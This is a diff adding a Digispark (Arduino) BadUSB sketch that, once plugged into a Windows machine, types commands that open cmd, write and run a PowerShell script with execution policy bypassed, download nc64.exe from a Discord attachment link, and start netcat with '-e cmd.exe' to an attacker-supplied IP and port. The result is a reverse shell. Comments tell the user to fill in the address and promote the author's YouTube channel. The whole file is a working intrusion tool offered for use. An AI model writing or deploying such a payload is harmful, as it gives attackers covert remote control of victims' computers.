@@ -1,0 +1,21 @@
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  // Change The IP and the Port, and for the netcat download link you can use it but it sure will expired so change it
+  // subscribe to my YouTube channel https://www.youtube.com/channel/UCL5HhLmJ7gSkf9zQu39LRoQ (dont really post anything related to this tho xD)
+  // for the ip address and the port pls do remove this symbol (<>) 
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("cd / & mkdir win & cd win & echo (wget 'https://cdn.discordapp.com/attachments/823520101415911464/826813046500491264/nc64.exe' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.print("START /MIN a.exe <IP ADDRESS> <PORT> -e cmd.exe -d & exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
